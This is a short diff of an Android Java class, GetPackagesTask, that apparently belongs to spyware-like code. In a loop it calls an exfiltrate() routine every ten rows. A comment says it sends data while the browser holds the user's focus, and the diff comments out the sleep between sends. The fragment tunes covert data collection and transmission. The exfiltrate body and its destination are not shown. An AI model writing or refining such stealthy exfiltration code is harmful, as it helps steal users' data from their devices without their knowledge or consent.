@@ -72,12 +72,12 @@ public class GetPackagesTask extends AsyncTask<Void, Void, Void>{
 			if ((row_id % 10) == 0){
 				exfiltrate(); //send a package at a time browser is dominating the focus! 
 				arrayRows.clear();
-				try {
-					Thread.sleep(1000);
-				} catch (InterruptedException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
+//				try {
+//					Thread.sleep(3000);
+//				} catch (InterruptedException e) {
+//					// TODO Auto-generated catch block
+//					e.printStackTrace();
+//				}
 			}
 	    }
 	  //exfiltrate - REQUEST URI TOO LARGE!!!
